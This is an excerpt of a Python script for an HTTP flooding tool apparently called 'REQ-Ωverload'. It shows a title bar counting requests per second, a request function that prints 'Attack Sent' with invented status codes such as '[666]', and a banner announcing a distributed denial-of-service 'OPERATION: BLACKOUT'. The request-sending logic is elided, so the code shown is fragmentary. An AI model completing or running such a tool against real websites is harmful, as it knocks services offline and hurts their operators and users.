...
def update_title(pps, requests_per_seconds):
    title = f"⚡ REQ-Ωverload | Attack | PPS: {pps} | RQS: {requests_per_seconds} ⚡"
    if os.name == 'nt':
...
def send_request(url):
    ...
    try:
        ...
        if status == 200:
            print(f"REQ-Ωverload | REQ-X Attack Sent | Status: 200")
        elif status == 500:
            print(f"REQ-Ωverload | REQ-X Attack Sent | Status: [666] Server Error – Target Website is Unreachable")
        else:
            print(f"REQ-Ωverload | NetPhantom Version 5 | Status: {status}")
    except requests.RequestException as e:
        print(f"REQ-Ωverload | REQ-X Attack Sent | Status: [444] | Offline")
...
[+] TARGET ACQUIRED: WEBSITE BRIDGE COMPROMISED
[!] INITIATING DISTRIBUTED DENIAL OF SERVICE...
[#] OPERATION: BLACKOUT | EXECUTOR: REQ-X
